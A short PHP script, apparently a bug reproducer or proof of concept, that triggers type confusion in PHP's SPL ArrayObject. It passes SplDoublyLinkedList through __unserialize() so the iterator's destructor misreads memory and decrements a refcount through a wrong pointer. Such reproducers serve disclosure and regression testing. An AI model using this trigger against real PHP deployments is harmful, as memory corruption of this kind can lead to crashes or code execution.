<?php
/**
 * ArrayObject::__unserialize() accepts any Iterator as the iterator class.
 * setIteratorClass() and the constructor require an ArrayIterator subclass.
 * getIterator() allocates a spl_array_object but stamps SplDoublyLinkedList's
 * handlers on it. free_obj then reads that object as a spl_dllist_object.
 */
echo "PHP_VERSION=" . PHP_VERSION . "\n";

$a = new ArrayObject([1, 2, 3]);
$payload = $a->__serialize();
/* SplDoublyLinkedList implements Iterator, so __unserialize accepts it.
 * setIteratorClass() would reject it (not an ArrayIterator subclass). */
$payload[3] = SplDoublyLinkedList::class;

$b = new ArrayObject();
$b->__unserialize($payload);
echo "iterator_class=" . $b->getIteratorClass() . "\n";

$it = $b->getIterator();
echo "got class=" . get_class($it) . "\n";
/* Destructor treats the spl_array_object as spl_dllist_object and
 * decrements a refcount through the mis-read traverse_pointer. */
unset($it);
echo "survived_unset\n";
